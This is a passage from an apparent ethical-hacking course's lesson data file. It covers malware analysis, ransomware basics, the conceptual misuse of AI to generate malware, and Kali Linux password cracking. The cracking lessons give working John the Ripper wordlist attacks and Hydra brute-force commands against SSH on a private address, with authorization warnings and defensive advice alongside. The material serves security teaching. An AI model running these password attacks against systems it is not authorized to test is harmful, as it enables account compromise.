                      <code class="text-green-400 block mb-1 font-mono">objdump -d suspicious_file</code>
                      <p class="text-sm text-gray-400">Disassemble binary to study instruction patterns and mutation.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Dynamic & Advanced Analysis</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">cuckoo submit suspicious_file</code>
                      <p class="text-sm text-gray-400">Execute malware in a Cuckoo Sandbox to observe behavior.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">volatility -f memory.img malfind</code>
                      <p class="text-sm text-gray-400">Memory Dump Analysis to detect unpacked payloads.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Defense Strategies</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Use behavior-based antivirus engines</li>
                    <li>Deploy EDR and XDR solutions</li>
                    <li>Monitor abnormal process behavior</li>
                    <li>Apply AI-based threat detection</li>
                    <li>Perform regular memory scans</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Ransomware Fundamentals',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Ransomware Fundamentals</h2>
          <p class="mb-4 text-gray-300">
            Ransomware is one of the most destructive and financially motivated forms of malware in modern cyber security. Its primary objective is to deny access to critical data or systems by encrypting files or locking the system, then demanding a ransom payment—usually in cryptocurrency—in exchange for the decryption key or system access. Unlike traditional malware that focuses on stealth, ransomware is designed for maximum impact and visibility.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Attack Lifecycle</h3>
          <p class="mb-4 text-gray-300">
            Ransomware attacks typically begin with initial access vectors such as phishing emails, malicious attachments, drive-by downloads, exploit kits, compromised RDP services, or supply-chain attacks. Once executed, the ransomware performs system reconnaissance, identifies valuable files, disables backups and recovery options, and then encrypts data using strong cryptographic algorithms like AES and RSA.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Modern Extortion Tactics</h3>
          <p class="mb-4 text-gray-300">
            Modern ransomware is no longer just about encryption. Many groups use <span class="text-white font-semibold">double extortion</span> and <span class="text-white font-semibold">triple extortion</span> techniques. In double extortion, attackers steal sensitive data before encryption and threaten to leak it publicly if the ransom is not paid. Triple extortion may include additional threats such as DDoS attacks or contacting customers and partners of the victim organization.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Ransomware-as-a-Service (RaaS)</h3>
          <p class="mb-4 text-gray-300">
            Ransomware operations today function like professional businesses. They use Ransomware-as-a-Service (RaaS) models where developers lease ransomware tools to affiliates who carry out attacks. This ecosystem includes payment portals, customer support for victims, leak sites, and negotiation teams, making ransomware a persistent global threat.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Common Types of Ransomware</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li><span class="text-white font-semibold">Crypto Ransomware:</span> Encrypts files and demands payment for decryption.</li>
            <li><span class="text-white font-semibold">Locker Ransomware:</span> Locks the system interface, preventing access without encrypting files.</li>
            <li><span class="text-white font-semibold">Scareware:</span> Uses fake warnings to trick users into paying money.</li>
            <li><span class="text-white font-semibold">RaaS:</span> Allows non-technical attackers to launch ransomware attacks.</li>
          </ul>

          <h3 class="text-lg font-semibold mb-2 text-white">Impact on Organizations</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Financial losses</li>
            <li>Operational downtime</li>
            <li>Data breaches and leaks</li>
            <li>Legal and regulatory penalties</li>
            <li>Reputation damage</li>
          </ul>
        `,
        syntax: [
          {
            title: 'Analysis & Defense Tools (Ethical Use Only)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Analysis & Defense Tools</h4>
                  <p class="text-gray-300 mb-4">Ethical Use: These tools assist in detecting active ransomware behavior and verifying data integrity.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">System Monitoring</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">ls -lh</code>
                      <p class="text-sm text-gray-400">Identify encrypted files (look for abnormal extensions and size changes).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">ps aux</code>
                      <p class="text-sm text-gray-400">Check running processes (identify high CPU usage by encryption).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">inotifywait -m /home</code>
                      <p class="text-sm text-gray-400">Monitor file system activity for mass modifications.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Network & Backup</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">tcpdump -i eth0</code>
                      <p class="text-sm text-gray-400">Monitor network traffic for C2 communication.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">rsnapshot diff</code>
                      <p class="text-sm text-gray-400">Backup verification to ensure integrity.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Prevention & Mitigation</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Regular offline backups</li>
                    <li>Email filtering and user awareness</li>
                    <li>Patch management</li>
                    <li>Network segmentation</li>
                    <li>Endpoint Detection & Response (EDR)</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'How AI Can Generate a Virus (Ethical Demonstration)',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">How AI Can Generate a Virus (Ethical Demonstration)</h2>
          <p class="mb-4 text-gray-300">
            The use of Artificial Intelligence (AI) in malware development is a highly sensitive and advanced topic in cyber security. In an ethical and defensive context, this subject is studied to understand how attackers may misuse AI, so that security professionals can anticipate, detect, and defend against future threats. This topic does NOT focus on creating real malware, but on understanding the conceptual role of AI in automating malicious behaviors.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">AI in Malware Development</h3>
          <p class="mb-4 text-gray-300">
            AI can assist attackers by automating tasks that traditionally required human effort, such as code generation, obfuscation, evasion, reconnaissance, and decision-making. For example, AI models can analyze large amounts of data to identify vulnerabilities, generate exploit variations, or adapt malware behavior based on the environment it is running in. This adaptability makes AI-assisted malware more dangerous than traditional static threats.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Key Areas of Misuse</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li><span class="text-white font-semibold">Malware Mutation:</span> AI models can automatically modify malware code to evade signature-based detection systems, similar to polymorphic and metamorphic techniques but at a much larger scale.</li>
            <li><span class="text-white font-semibold">Adaptive Execution:</span> AI can help malware decide when to stay dormant, when to execute, or when to self-delete if it detects sandboxing or analysis environments.</li>
            <li><span class="text-white font-semibold">AI-Powered Social Engineering:</span> Attackers use AI to generate highly convincing, context-aware phishing messages, mimicking writing styles and languages to increase success rates.</li>
          </ul>

          <h3 class="text-lg font-semibold mb-2 text-white">Defensive Perspective</h3>
          <p class="mb-4 text-gray-300">
            From a defensive standpoint, cyber security professionals study AI-generated malware to improve AI-based detection systems, strengthen behavioral analysis engines, train SOC teams for next-generation threats, and design adaptive security controls.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Ethical Use vs Malicious Use</h3>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Ethical Research</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Simulating malware behavior</li>
                <li>Training detection models</li>
                <li>Studying evasion techniques</li>
                <li>Improving SOC response</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Malicious Use</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Autonomous malware propagation</li>
                <li>Adaptive ransomware</li>
                <li>Stealthy persistence mechanisms</li>
                <li>Large-scale phishing automation</li>
              </ul>
            </div>
          </div>
          <p class="mb-4 text-gray-300 italic">
            Ethical guidelines strictly prohibit creating or deploying real malware. All demonstrations must be conducted in isolated lab environments, using simulated code or benign payloads for educational purposes only.
          </p>
        `,
        syntax: [
          {
            title: 'Defensive & Research-Oriented Tools (Safe & Ethical)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Defensive & Research Tools</h4>
                  <p class="text-yellow-400 mb-4 text-sm bg-yellow-400/10 p-2 rounded border border-yellow-400/20">
                    ⚠️ The following tools are used for simulation, analysis, and defense, not for creating real malware.
                  </p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Simulation & Monitoring</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">touch test_payload_simulation.txt</code>
                      <p class="text-sm text-gray-400">Generate benign test files for detection training.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">auditctl -w /tmp -p war</code>
                      <p class="text-sm text-gray-400">Monitor suspicious file access and execution patterns.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">htop</code>
                      <p class="text-sm text-gray-400">Process anomaly detection (CPU, memory, execution behavior).</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Analysis & Research</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">cuckoo submit sample_file</code>
                      <p class="text-sm text-gray-400">Sandbox behavioral analysis in a controlled environment.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">python3 analyze_features.py</code>
                      <p class="text-sm text-gray-400">Machine Learning Dataset Analysis (Conceptual feature extraction).</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Defensive Strategies</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>AI-powered EDR and XDR solutions</li>
                    <li>Zero Trust security architecture</li>
                    <li>Continuous behavioral monitoring</li>
                    <li>Threat intelligence integration</li>
                    <li>Regular red-team and blue-team exercises</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      }
    ]
  },
  {
    id: 'module-2',
    title: 'Module 2: Password Cracking in Kali Linux',
    duration: '1 week',
    description: 'Learn techniques for password auditing and recovery using industry-standard tools.',
    lessons: [
      {
        title: 'Introduction to Password Cracking',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Introduction to Password Cracking</h2>
          <p class="mb-4 text-gray-300">
            Password cracking is the process of recovering passwords from stored or transmitted authentication data. In cyber security, this technique is studied strictly for ethical purposes, such as penetration testing, security auditing, digital forensics, and password policy evaluation. Understanding how passwords are cracked helps organizations identify weak authentication mechanisms and improve overall security posture.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">How Passwords Are Stored</h3>
          <p class="mb-4 text-gray-300">
            Passwords are commonly stored in systems as hashed values, not plain text. A hash is a one-way mathematical function that converts a password into a fixed-length string. However, weak hashing algorithms, poor password policies, reused credentials, and predictable patterns make passwords vulnerable to cracking attacks. Password cracking attempts to guess or compute the original password by comparing generated hashes with stored hashes.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Common Attack Techniques</h3>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Brute-Force Attacks</h4>
              <p class="text-sm text-gray-300">Tries every possible password combination until the correct one is found. Guaranteed to work but extremely time-consuming.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Dictionary Attacks</h4>
              <p class="text-sm text-gray-300">Uses precompiled wordlists containing common passwords and leaked credentials. Highly effective against weak passwords.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Hybrid Attacks</h4>
              <p class="text-sm text-gray-300">Combines dictionary words with rule-based mutations (e.g., adding numbers, changing case).</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Rainbow Table Attacks</h4>
              <p class="text-sm text-gray-300">Uses precomputed hash tables to reverse unsalted hashes quickly. Salting defeats this.</p>
            </div>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Online vs Offline Cracking</h3>
          <p class="mb-4 text-gray-300">
            <span class="text-white font-semibold">Online attacks</span> target live services and are limited by lockout policies. <span class="text-white font-semibold">Offline attacks</span> crack stolen hash files without restrictions, making them far more dangerous.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Why It Matters for Defenders</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Identify weak password policies</li>
            <li>Enforce strong authentication mechanisms</li>
            <li>Implement account lockout rules</li>
            <li>Deploy MFA effectively</li>
            <li>Educate users about password hygiene</li>
          </ul>

          <div class="bg-red-900/20 border border-red-900/50 p-4 rounded mb-4">
            <h4 class="text-red-400 font-semibold mb-2">⚠️ Legal Warning</h4>
            <p class="text-gray-300 text-sm">
              Ethical hackers must always obtain explicit written authorization before performing password cracking activities. Unauthorized password cracking is illegal and punishable under cyber laws.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Password Cracking Ecosystem (Intro Level)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Preparation & Tools</h4>
                  <p class="text-gray-300 mb-4">Setting up the environment for ethical password auditing.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Wordlist Management</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">ls /usr/share/wordlists/</code>
                      <p class="text-sm text-gray-400">Locate common wordlists in Kali Linux.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">gzip -d /usr/share/wordlists/rockyou.txt.gz</code>
                      <p class="text-sm text-gray-400">Decompress the famous RockYou wordlist.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">head rockyou.txt</code>
                      <p class="text-sm text-gray-400">View sample passwords from the wordlist.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Analysis Tools</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hashid hash.txt</code>
                      <p class="text-sm text-gray-400">Identify the hash type (Crucial preparation step).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">htop</code>
                      <p class="text-sm text-gray-400">Monitor CPU usage during cracking operations.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Ethical Guidelines</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Perform attacks only in lab or authorized environments</li>
                    <li>Never target real users without permission</li>
                    <li>Document findings responsibly</li>
                    <li>Recommend remediation steps</li>
                    <li>Follow responsible disclosure policies</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'John the Ripper Basics',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">John the Ripper Basics</h2>
          <p class="mb-4 text-gray-300">
            John the Ripper (JtR) is one of the most widely used and respected password auditing and recovery tools in cyber security. It is designed to identify weak passwords by performing controlled cracking attempts against password hashes. In professional environments, John is used during security audits, penetration tests, incident response, and forensic investigations—always with proper authorization.
          </p>
          <p class="mb-4 text-gray-300">
            At its core, John works by taking hashed passwords (not plaintext passwords) and attempting to recover the original passwords by applying various attack strategies. These strategies include dictionary attacks, rule-based mutations, incremental (brute-force-like) methods, and hybrid techniques. John compares the hashes it generates from guessed passwords against the target hashes; when a match occurs, the password is considered cracked.
          </p>
          <p class="mb-4 text-gray-300">
            One of John’s biggest strengths is its support for a large number of hash formats. It can handle traditional Unix password hashes, Windows LM/NTLM hashes, MD5, SHA variants, bcrypt, and many application-specific formats. This makes it extremely useful across Linux, Windows, web applications, and network services.
          </p>
          <p class="mb-4 text-gray-300">
            John is also highly customizable. Security professionals can define rules that modify dictionary words (for example, adding numbers, changing case, or appending symbols) to simulate real-world user behavior. Since many users create passwords by slightly modifying common words, rule-based attacks are often far more effective than pure brute force.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Defensive Perspective</h3>
          <p class="mb-4 text-gray-300">
            From a defensive perspective, John helps organizations:
          </p>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Test the strength of password policies</li>
            <li>Identify reused or predictable passwords</li>
            <li>Evaluate the effectiveness of hashing algorithms</li>
            <li>Justify the need for MFA and stronger controls</li>
          </ul>
          <p class="mb-4 text-gray-300">
            It is important to understand that John is not a “hacking shortcut.” Its success depends on password quality, hashing strength, and system defenses. Strong passwords combined with modern hashing algorithms can make cracking impractical.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">John the Ripper Workflow (High-Level)</h3>
          <ol class="list-decimal list-inside text-gray-300 mb-4 space-y-1">
            <li>Collect password hashes from an authorized source</li>
            <li>Identify the hash format</li>
            <li>Choose an appropriate attack mode</li>
            <li>Run cracking attempts</li>
            <li>Analyze results and recommend remediation</li>
          </ol>
        `,
        syntax: [
          {
            title: 'John the Ripper Basic Commands',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">John the Ripper Basic Commands</h4>
                  <p class="text-gray-300 mb-4">Ethical Use Only: Ensure you have authorization before running these commands.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Basic Usage</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john --version</code>
                      <p class="text-sm text-gray-400">Check John Installation.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john hash.txt</code>
                      <p class="text-sm text-gray-400">Identify Hash Type Automatically & Start Cracking.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john --format=md5crypt hash.txt</code>
                      <p class="text-sm text-gray-400">Specify Hash Format Manually.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code>
                      <p class="text-sm text-gray-400">Basic Dictionary Attack using RockYou wordlist.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john --show hash.txt</code>
                      <p class="text-sm text-gray-400">Show Cracked Passwords.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john --status</code>
                      <p class="text-sm text-gray-400">Check Cracking Status.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Best Practices for Defenders</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Use strong, unique passwords</li>
                    <li>Enforce minimum length and complexity</li>
                    <li>Use slow hashing algorithms (bcrypt, scrypt, Argon2)</li>
                    <li>Implement MFA</li>
                    <li>Monitor failed authentication attempts</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'John the Ripper Wordlist Attacks',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">John the Ripper Wordlist Attacks</h2>
          <p class="mb-4 text-gray-300">
            Wordlist attacks are one of the most effective and commonly used techniques in password cracking because they closely mirror real human behavior. Instead of trying every possible character combination (as in brute force), wordlist attacks rely on curated lists of commonly used passwords, leaked credentials, dictionary words, names, keyboard patterns, and predictable variations. In real-world environments, a significant percentage of users still choose weak or reused passwords, making wordlist attacks highly successful during security audits.
          </p>
          <p class="mb-4 text-gray-300">
            In John the Ripper, a wordlist attack works by taking each word from a list and hashing it using the same algorithm as the target system. The resulting hash is then compared against the stored hash. If a match is found, the original password is revealed. This method is much faster than brute-force attacks and is especially effective when users rely on simple words, dates, or minor variations such as appending numbers or symbols.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Wordlist Rules & Variations</h3>
          <p class="mb-4 text-gray-300">
            Wordlist attacks become even more powerful when combined with rules. Rules modify each word in the list to generate multiple variations, such as capitalizing the first letter, replacing letters with symbols, adding numbers at the end, or duplicating words. For example, a single word like <code class="text-green-400 font-mono">password</code> can generate hundreds of variations such as <code class="text-green-400 font-mono">Password</code>, <code class="text-green-400 font-mono">password123</code>, <code class="text-green-400 font-mono">P@ssword</code>, or <code class="text-green-400 font-mono">password@2024</code>. This reflects how users typically create passwords while still keeping them memorable.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Common Sources of Wordlists</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Leaked credential databases</li>
            <li>Default password lists</li>
            <li>Language dictionaries</li>
            <li>Organization-specific terms</li>
            <li>OSINT-based custom wordlists</li>
          </ul>
          <p class="mb-4 text-gray-300">
            Kali Linux includes several built-in wordlists, with <strong>RockYou</strong> being the most famous.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Defensive Perspective</h3>
          <p class="mb-4 text-gray-300">
            From a defensive perspective, studying wordlist attacks highlights why password complexity alone is not enough. Even complex-looking passwords can be cracked if they follow predictable patterns. This is why modern security policies emphasize password length, uniqueness, and MFA, rather than just symbol requirements.
          </p>
        `,
        syntax: [
          {
            title: 'Wordlist Attack Commands (Ethical Use Only)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">John the Ripper Wordlist Attacks</h4>
                  <p class="text-gray-300 mb-4">Ethical Use Only: Use these commands only on systems you own or have explicit permission to test.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Wordlist Management</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">ls /usr/share/wordlists/</code>
                      <p class="text-sm text-gray-400">Locate available wordlists in Kali Linux.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">gzip -d /usr/share/wordlists/rockyou.txt.gz</code>
                      <p class="text-sm text-gray-400">Prepare the RockYou wordlist (unzip it first).</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Attack Commands</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code>
                      <p class="text-sm text-gray-400">Basic Wordlist Attack using RockYou.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt</code>
                      <p class="text-sm text-gray-400">Wordlist Attack with Rules (Try variations like P@ssword1).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john --wordlist=custom_words.txt hash.txt</code>
                      <p class="text-sm text-gray-400">Use a Custom Wordlist (Targeted Attack).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john --show hash.txt</code>
                      <p class="text-sm text-gray-400">Show Cracked Passwords.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">john --restore</code>
                      <p class="text-sm text-gray-400">Resume an Interrupted Session.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Defensive Measures</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Enforce long and unique passwords</li>
                    <li>Use password managers</li>
                    <li>Implement account lockout policies</li>
                    <li>Apply salted and slow hashing algorithms</li>
                    <li>Enable Multi-Factor Authentication (MFA)</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Introduction to Hydra',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Introduction to Hydra</h2>
          <p class="mb-4 text-gray-300">
            Hydra (THC Hydra) is a powerful and fast online password attack tool used by ethical hackers to test the strength of network services and remote authentication mechanisms. Unlike John the Ripper, which focuses on offline password cracking using hashes, Hydra performs online brute-force and dictionary attacks directly against live services such as SSH, FTP, HTTP, RDP, MySQL, SMTP, and many others.
          </p>
          <p class="mb-4 text-gray-300">
            Hydra works by repeatedly attempting login requests using combinations of usernames and passwords supplied through wordlists. It is highly optimized for speed and parallelism, meaning it can attempt multiple login attempts simultaneously, making it effective during penetration tests—especially when testing misconfigured systems that lack proper rate limiting or account lockout policies.
          </p>
          <p class="mb-4 text-gray-300">
            Because Hydra interacts with live systems, it is considered much more sensitive and risky than offline tools. Excessive login attempts can trigger alarms, lock accounts, or even cause service disruption. This is why Hydra must only be used in authorized environments, such as lab setups, CTFs, or with written client permission during professional security assessments.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Offline vs Online Cracking</h3>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Offline (John, Hashcat)</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Uses stolen hashes</li>
                <li>Very fast</li>
                <li>No account lockouts</li>
                <li>Stealthy (no network traffic)</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Online (Hydra)</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Attacks live services</li>
                <li>Slower due to network latency</li>
                <li>Detectible (logs, alarms)</li>
                <li>Can trigger lockouts</li>
              </ul>
            </div>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Defensive Perspective</h3>
          <p class="mb-4 text-gray-300">
            From a defensive viewpoint, learning Hydra helps security teams understand:
          </p>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>How attackers exploit weak credentials</li>
            <li>Why default passwords are dangerous</li>
            <li>The importance of rate limiting and MFA</li>
            <li>How account lockout policies prevent attacks</li>
          </ul>
        `,
        syntax: [
          {
            title: 'Hydra Basic Commands (Ethical Use Only)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Hydra Basic Commands</h4>
                  <p class="text-gray-300 mb-4">Ethical Use Only: Do not use against servers you do not own or have permission to test.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Basic Syntax & Usage</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -h</code>
                      <p class="text-sm text-gray-400">Check Hydra Installation and help menu.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -l user -P passlist.txt ssh://target</code>
                      <p class="text-sm text-gray-400">Basic syntax structure.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -l admin -P rockyou.txt ssh://192.168.1.10</code>
                      <p class="text-sm text-gray-400">Single Username, Wordlist Password Attack (SSH).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -L users.txt -P passwords.txt ssh://192.168.1.10</code>
                      <p class="text-sm text-gray-400">Multiple Usernames and Passwords.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -t 4 -l admin -P passwords.txt ssh://192.168.1.10</code>
                      <p class="text-sm text-gray-400">Specify Number of Threads (Speed control).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -vV -l admin -P passwords.txt ssh://192.168.1.10</code>
                      <p class="text-sm text-gray-400">Verbose Output (Show attempts).</p>
                    </div>
                  </div>
                </div>

                <div>
